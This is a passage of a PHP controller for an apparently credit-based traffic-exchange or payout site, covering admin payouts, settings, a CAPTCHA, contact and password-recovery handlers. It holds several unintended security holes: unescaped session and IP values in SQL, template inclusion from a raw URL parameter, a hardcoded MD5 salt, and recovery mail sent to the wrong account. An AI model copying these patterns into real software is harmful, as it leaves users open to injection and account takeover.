	mysql_query("UPDATE merchants SET active='1' WHERE id='".mysql_escape_string($_POST[merchant])."'");
	header("Location: /?n=admin_merchants");
	die();
}


if ($_GET[action]=="addemails") {

	$emails = split("\n", $_POST[emails]);
	//echo("email1: $emails[0]<br>");
	//echo("email2: $emails[1]<br>");
	//echo("email3: $emails[2]<br>");

	$i=0;
	while($i < count($emails)) {
		$temp_email=$emails["$i"];
		if (strlen($temp_email)<100) {
			if (strpos($temp_email,"@")!==FALSE) {
				if ($i > 1000) {
					$temp_username="mikej";
				} else {
					$temp_username=$userinfo[username];
				}
				$temp_email=mysql_escape_string($temp_email);
				mysql_query("INSERT INTO `emails` ( `id` , `username` , `email` , `sent` ) VALUES ('', '$temp_username', '$temp_email', '0')");
			}
		}
		$i++;
	}

	header("Location: /");
	
}


if ($_GET[action]=="editsite") {
	$_GET[n]="editsite";
	$temp_id	=mysql_escape_string($_GET[id]);
	$temp_title	=mysql_escape_string($_POST[site_title]);
	$temp_url	=mysql_escape_string($_POST[site_url]);
	$allocate_credits=mysql_escape_string($_POST[allocate_credits]);
	$result=mysql_query("SELECT * FROM sites WHERE username='$userinfo[username]' AND id='$temp_id'");
	$siteinfo=mysql_fetch_array($result);
	$isEnabled=$siteinfo[enabled];
	if ($temp_url!=$siteinfo[url]) {
		$isEnabled=0;
	}

	if (strlen($temp_title)<2) {
		$show_error="Title is too short!";
	} else if ($temp_url=="") {
		$show_error="URL must not be blank!";
	} else if (strpos($temp_url,"http")===FALSE) {
		$show_error="HTTP or HTTPS must be includes in the url.";
	} else if (is_numeric($allocate_credits)===FALSE) {
		$show_error="Invalid allocate credits number!";
	} else if ($allocate_credits>$userinfo[credits]) {
		$show_error="You do not have enough credits!";
	} else {
		mysql_query("UPDATE sites SET title='$temp_title', url='$temp_url', enabled='$isEnabled', credits=credits+'$allocate_credits' WHERE username='$userinfo[username]' AND id='$temp_id'");
		mysql_query("UPDATE accounts SET credits=credits-'$allocate_credits' WHERE username='$userinfo[username]'");
		header("Location: /?n=sitelist");
		die();
	}
	

	$smarty->assign('show_error',$show_error);

}

if ($_GET[n]=="tournum") {

	$randnum	= rand(10000,99999);

	session_start();

	if ($_SESSION["TourNum"]!="" && ($_GET[n]=="register" || $_GET[n]=="login")) {
		$randnum=$_SESSION["TourNum"];
	} else {

	$_SESSION["TourNum"]=$randnum;
	
	}

	header("Content-type: image/png");
	$im = @imagecreate(81,33)
	   or die("Cannot Initialize new GD image stream");

	$im2 = @imagecreatefrompng("grid8.png");

	imagecopymerge($im,$im2,0,0,0,0,81,33,100);

	$int = hexdec("#FFFFFF");
	$background_color	= imagecolorallocate($im, 0xFF & ($int >> 0x10), 0xFF & ($int >> 0x8), 0xFF & $int);

	$int = hexdec("#000000");
	$text_color		= imagecolorallocate($im, 125, 125, 125);

	$y[1]=rand(5,15);
	$y[2]=rand(5,15);
	$y[3]=rand(5,15);
	$y[4]=rand(5,15);
	$y[5]=rand(5,15);

	$x[1]=rand(1,3);
	$x[2]=rand(1,3);
	$x[3]=rand(1,3);
	$x[4]=rand(1,3);
	$x[5]=rand(1,3);

	imagestring($im, 35, 10+$x[1], $y[1], substr($randnum,0,1), $text_color);
	imagestring($im, 36, 20+$x[2], $y[2], substr($randnum,1,1), $text_color);
	imagestring($im, 37, 30+$x[3], $y[3], substr($randnum,2,1), $text_color);
	imagestring($im, 38, 40+$x[4], $y[4], substr($randnum,3,1), $text_color);
	imagestring($im, 39, 50+$x[5], $y[5], substr($randnum,4,1), $text_color);

	imageline($im, 0, 1, 1, 1, $grid_color);

	imagepng($im);
	imagedestroy($im);
}

if ($_GET[n]=="editsite") {

	$tempid=mysql_escape_string($_GET[id]);

	$result=mysql_query("SELECT * FROM sites WHERE id='$tempid' AND username='$userinfo[username]'");
	$siteinfo=mysql_fetch_array($result);

	$smarty->assign('siteinfo',$siteinfo);
	$smarty->assign('id',$_GET[id]);

}


if ($_GET[action]=="admin_save_masspay" && $userinfo[is_admin]==1) {
	mysql_query("UPDATE merchants SET mass_pay='".mysql_escape_string($_POST[mass_pay])."' WHERE id='".mysql_escape_string($_GET[id])."'") OR die(mysql_error());
	header("Location: /?n=admin_make_payouts&step=1&id=".mysql_escape_string($_GET[id]));
}

if ($_GET[action]=="save_merchant_info" && $userinfo[is_admin]==1) {
	$temp_eta=mysql_escape_string($_POST[eta]);
	$temp_withdraw_min=mysql_escape_string($_POST[min_withdraw]);
	$temp_active=mysql_escape_string($_POST[is_enabled]);
	$temp_id=mysql_escape_string($_GET[id]);
	mysql_query("UPDATE merchants SET eta='$temp_eta', min_withdraw='$temp_withdraw_min', active='$temp_active', account_id='".mysql_escape_string($_POST[account_id])."', autopay_account_id='".mysql_escape_string($_POST[autopay_account_id])."', autopay_account_pass='".mysql_escape_string($_POST[autopay_account_pass])."', instant='".mysql_escape_string($_POST[is_instant])."', secret_code='".mysql_escape_string($_POST[secret_code])."'  WHERE id='$temp_id'") OR die(mysql_error());
	header("Location: /?n=admin_merchants");
}

if ($_GET[action]=="masspay" && $userinfo[is_admin]==1) {

	$result=mysql_query("SELECT * FROM merchants WHERE id='".mysql_escape_string($_GET[id])."'");
	$merchantinfo=mysql_fetch_array($result);
	header('Content-Disposition: attachment; filename="'.$merchantinfo[name].'_masspay.txt"');
	$result2=mysql_query("SELECT * FROM history WHERE paid='0' AND type='2' AND source='$merchantinfo[name]'");
	while ($row=mysql_fetch_array($result2)) { 
		$templine=$merchantinfo[mass_pay];
		$templine=str_replace("[account]",$row[account_id],$templine);
		$templine=str_replace("[amount]",$row[amount],$templine);
		$templine=str_replace("[note]","Withdraw User:".$row[username],$templine);
		echo($templine."\n");
	}
	die();

}

if ($_GET[action]=="admin_edit_user" && $userinfo[is_admin]==1) {
	$temp_id=mysql_escape_string($_GET[id]);

	$temp_password=mysql_escape_string($_POST[password]);
	$temp_email=mysql_escape_string($_POST[email]);
	$temp_credits=mysql_escape_string($_POST[credits]);
	$temp_name=mysql_escape_string($_POST[name]);

	$result=mysql_query("SELECT * FROM accounts WHERE id='$temp_id'");
	$targetinfo=mysql_fetch_array($result);

	if ($temp_password=="") {
		$temp_password=$targetinfo[password];
	} else {
		$temp_password=md5("mfSSD>$#@99mdJISoAsk10A".$temp_password);
	}

	mysql_query("UPDATE accounts SET password='$temp_password', email='$temp_email', credits='$temp_credits', name='$temp_name' WHERE id='$temp_id' LIMIT 1");

	header("Location: /?n=admin_edit_user&id=$temp_id&saved=1");
	die();

}

if ($_GET[action]=="save_settings" && $userinfo[is_admin]==1) {

	$filename = 'vars.php';
	$somecontent = "<?php\n";
	$somecontent .= '$VARS_DB="'."$VARS_DB\";\n";
	$somecontent .= '$VARS_USER="'."$VARS_USER\";\n";
	$somecontent .= '$VARS_PASS="'."$VARS_PASS\";\n";
	$somecontent .= '$VARS_SERVER="'."$VARS_SERVER\";\n\n";
	$somecontent .= '$settings[site_title]="'.mysql_escape_string($_POST[site_title])."\";\n";
	$somecontent .= '$settings[site_name]="'.mysql_escape_string($_POST[site_name])."\";\n";
	$somecontent .= '$settings[unit_price]="'.mysql_escape_string($_POST[unit_price])."\";\n";
	$somecontent .= '$settings[max_units]="'.mysql_escape_string($_POST[max_units])."\";\n";
	$somecontent .= '$settings[ref_commission]="'.mysql_escape_string($_POST[ref_commission])."\";\n";
	$somecontent .= '$settings[free_ref_commission]="'.mysql_escape_string($_POST[free_ref_commission])."\";\n";
	$somecontent .= '$settings[site_url]="'.mysql_escape_string($_POST[site_url])."\";\n";
	$somecontent .= '$settings[allow_deposit]="'.mysql_escape_string($_POST[allow_deposit])."\";\n";
	$somecontent .= '$settings[enable_member_news]="'.mysql_escape_string($_POST[enable_member_news])."\";\n\n";
	$somecontent .= '$settings[unit_per_credit]="'.mysql_escape_string($_POST[unit_per_credit])."\";\n\n";
	$somecontent .= '$settings[max_views]="'.mysql_escape_string($_POST[max_views])."\";\n\n";
	$somecontent .= '$settings[free_surf]="'.mysql_escape_string($_POST[free_surf])."\";\n\n";
	$somecontent .= '$settings[date_launched]="'.mysql_escape_string($_POST[date_launched])."\";\n\n";
	$somecontent .= '$settings[my_key]="'.mysql_escape_string($_POST[my_key])."\";\n\n";
	$somecontent .= '$settings[tour_num]="'.mysql_escape_string($_POST[tour_num])."\";\n\n";

	$somecontent .= '$settings[from_mail]="'.mysql_escape_string($_POST[from_mail])."\";\n\n";

	$somecontent .= '$settings[days_till_expire]="'.mysql_escape_string($_POST[days_till_expire])."\";\n\n";
	$somecontent .= '$settings[surf_page_refresh]="'.mysql_escape_string($_POST[surf_page_refresh])."\";\n\n";
	$somecontent .= '$settings[free_member_credits]="'.mysql_escape_string($_POST[free_member_credits])."\";\n\n";
	$somecontent .= '$settings[pro_member_credits]="'.mysql_escape_string($_POST[pro_member_credits])."\";\n\n";
	$somecontent .= '$settings[surf_required]="'.mysql_escape_string($_POST[surf_required])."\";\n\n";
	$somecontent .= '$settings[daily_percent]="'.mysql_escape_string($_POST[daily_percent])."\";\n\n";
	$somecontent .= '$settings[is_installed]="'."1"."\";\n\n";

	$somecontent .= '$settings[show_news]="'.mysql_escape_string($_POST[show_news])."\";\n";
	$somecontent .= '$settings[news_count]="'.mysql_escape_string($_POST[news_count])."\";\n";
	$somecontent .= '$settings[show_stats]="'.mysql_escape_string($_POST[show_stats])."\";\n\n";
	$somecontent .= '$settings[show_stats_total_members]="'.mysql_escape_string($_POST[show_stats_total_members])."\";\n";
	$somecontent .= '$settings[show_stats_total_members_today]="'.mysql_escape_string($_POST[show_stats_total_members_today])."\";\n";
	$somecontent .= '$settings[show_stats_active_members]="'.mysql_escape_string($_POST[show_stats_active_members])."\";\n";
	$somecontent .= '$settings[show_stats_total_deposited]="'.mysql_escape_string($_POST[show_stats_total_deposited])."\";\n";
	$somecontent .= '$settings[show_stats_total_paid]="'.mysql_escape_string($_POST[show_stats_total_paid])."\";\n";
	$somecontent .= '$settings[show_stats_total_deposited_today]="'.mysql_escape_string($_POST[show_stats_total_deposited_today])."\";\n";
	$somecontent .= '$settings[show_stats_total_paid_today]="'.mysql_escape_string($_POST[show_stats_total_paid_today])."\";\n";
	$somecontent .= '$settings[show_stats_date_started]="'.mysql_escape_string($_POST[show_stats_date_started])."\";\n\n";
	$somecontent .="?>";
	if (is_writable($filename)) {


	   if (!$handle = fopen($filename, 'w')) {
 	        echo "Cannot open file ($filename)";
 	        exit;
 	   }

   	// Write $somecontent to our opened file.
   	if (fwrite($handle, $somecontent) === FALSE) {
   	    echo "Cannot write to file ($filename)";
   	    exit;
   	}
  
  	 //echo("SAVED");
	header("Location: /?n=admin_settings&saved=1");
  
   	fclose($handle);

	} else {
 	  //echo("FAILED");
	header("Location: /?n=admin_settings");
	}

}

if ($_GET[action]=="contact") {

			$to = $settings[from_mail];
			$subject = "$settings[site_name] $_POST[subject]";
			$message = "<b>username: $_POST[username]</b><br><br>$_POST[message]";
			$headers = "From: $settings[from_mail]\r\n" .
			'X-Mailer: PHP/' . phpversion() . "\r\n" .
		       "MIME-Version: 1.0\r\n" .
		       "Content-Type: text/html; charset=utf-8\r\n" .
		       "Content-Transfer-Encoding: 8bit\r\n\r\n";

			mail($to, $subject, $_POST[message], $headers);

}

if ($_GET[n]=="forgot_pw") {

	if ($_GET[step]=="1") {
	$temp_searchfor=mysql_escape_string($_POST[searchfor]);
	$result=mysql_query("SELECT * FROM accounts WHERE username='$temp_searchfor' OR email='$temp_searchfor' LIMIT 1");
	$targetinfo=mysql_fetch_array($result);
	
		if ($targetinfo[username]=="") {
			$show_error="Username or e-mail not found!";
		} else {
			$to = $userinfo[email];
			$subject = "$settings[site_name] password recovery.";
			$message = "$userinfo[name],<br><br>You or someone else has requested a form to create a new password, If you did not request this e-mail it may be best to change your password anyways. <br><br><a href=\"http://$settings[site_url]/?n=forgot_pw&step=2\">Click Here to set a new password</a>";
			$headers = "From: $settings[from_mail]\r\n" .
			'X-Mailer: PHP/' . phpversion() . "\r\n" .
		       "MIME-Version: 1.0\r\n" .
		       "Content-Type: text/html; charset=utf-8\r\n" .
		       "Content-Transfer-Encoding: 8bit\r\n\r\n";

			mail($to, $subject, $message, $headers);
		}


	}

	$smarty->assign('step',$_GET[step]);
	$smarty->assign('show_error',$show_error);

}


if ($_GET[action]=="markpaid" && $userinfo[is_admin]==1) {
	mysql_query("UPDATE history SET paid='1' WHERE id='".mysql_escape_string($_GET[id])."'");
	header("Location: /?n=admin_make_payouts&step=1&id=".mysql_escape_string($_GET['return']));
}

if ($_GET[n]=="") { $_GET[n]="home"; }

	$todays_date=date("m-d-y");

	$result=mysql_query("SELECT * FROM accounts");
	$showdata[total_accounts]=number_format(mysql_num_rows($result),0);

	$result=mysql_query("SELECT * FROM accounts WHERE join_date='$todays_date'");
	$showdata[total_accounts_today]=number_format(mysql_num_rows($result),0);

	$result=mysql_query("SELECT sum(amount) FROM history WHERE type='1'");
	$showdata[total_deposited]=number_format(mysql_result($result,0),2);

	$result=mysql_query("SELECT * FROM history WHERE type='1'");
	$showdata[total_deposited_today]=0;
		while($row=mysql_fetch_array($result)) {
			if (date("m-d-y",$row[date])==$todays_date) {
			$showdata[total_deposited_today]=$showdata[total_deposited_today]+$row[amount];
			}
		}

	$showdata[total_deposited_today]=number_format($showdata[total_deposited_today],2);

	$result=mysql_query("SELECT sum(amount) FROM history WHERE type='2' AND paid='1'");
	$showdata[total_withdrawn]=number_format(mysql_result($result,0),2);

	$result=mysql_query("SELECT * FROM history WHERE type='2'");
	$showdata[total_withdrawn_today]=0;
		while($row=mysql_fetch_array($result)) {
			if (date("m-d-y",$row[date])==$todays_date) {
			$showdata[total_withdrawn_today]=$showdata[total_withdrawn_today]+$row[amount];
			}
		}

	
	$showdata[total_withdrawn_today]=number_format($showdata[total_withdrawn_today],2);

	$showdata[est_profit]=number_format($showdata[total_deposited]-$showdata[total_withdrawn],2);

	$result=mysql_query("SELECT sum(count) FROM hits");
	$showdata[total_site_hits]=number_format(mysql_result($result,0),0);

	$result=mysql_query("SELECT sum(count) FROM hits WHERE date='$todays_date'");
	$showdata[total_site_hits_today]=number_format(mysql_result($result,0),0);



function hitcount()
{
$file = "counter.txt";
if ( !file_exists($file)){
       touch ($file);
       $handle = fopen ($file, 'r+'); // Let's open for read and write
       $count = 0;

}
else{
       $handle = fopen ($file, 'r+'); // Let's open for read and write
       $count = fread ($handle, filesize ($file));
       settype ($count,"integer");
}
rewind ($handle); // Go back to the beginning
/*
 * Note that we don't have problems with 9 being fewer characters than
  * 10 because we are always incrementing, so we will always write at
   * least as many characters as we read
   **/
fwrite ($handle, ++$count); // Don't forget to increment the counter
fclose ($handle); // Done

return $count;
}      


if ($_GET[n]=="home" && $_GET[ref]!="") {
session_start();

$_SESSION["RefID"]=$_GET[ref];

header("Location: ?");

}

$result=mysql_query("SELECT * FROM sites WHERE credits > '0' AND enabled='1' ORDER BY RAND() LIMIT 4");
$mcount2=mysql_num_rows($result);
while ($row=mysql_fetch_array($result)) { 
	$temp_array=array(array("id" => $row[id], "title" => $row[title]));
	if ($array7=="") {
		$array7=$temp_array;
	} else {
		$array7=array_merge_recursive($array7,$temp_array);
	}
	
}

$todays_date=date("m-d-y");
$result=mysql_query("SELECT * FROM single_hit WHERE ip='$ip' AND date='$todays_date'");
if (mysql_num_rows($result)==0) {
	mysql_query("INSERT INTO `single_hit` ( `ip` , `refid` , `date` ) VALUES ('$ip', '".$_SESSION["RefID"]."', '$todays_date')");
} else {
	mysql_query("UPDATE single_hit SET count=count+1 WHERE ip='$ip' AND date='$todays_date' LIMIT 1");
}

$smarty->compile_check = true;
$smarty->assign ('valid', $valid);
$smarty->assign ('linkads', $array7);
$smarty->assign ('servertime', date("F j, Y, g:i a"));
$smarty->assign ('versioninfo', $versioninfo);
$smarty->assign ('userinfo', $userinfo);
$smarty->assign ('welcometext', $_GET[n]);
$smarty->assign ('time', time());
$smarty->assign ('showdata', $showdata);
$smarty->assign ('settings', $settings);
$smarty->template_dir = './style/';
$smarty->compile_dir = './temp_data';
$smarty->display ($_GET[n].'.tpl');



?>
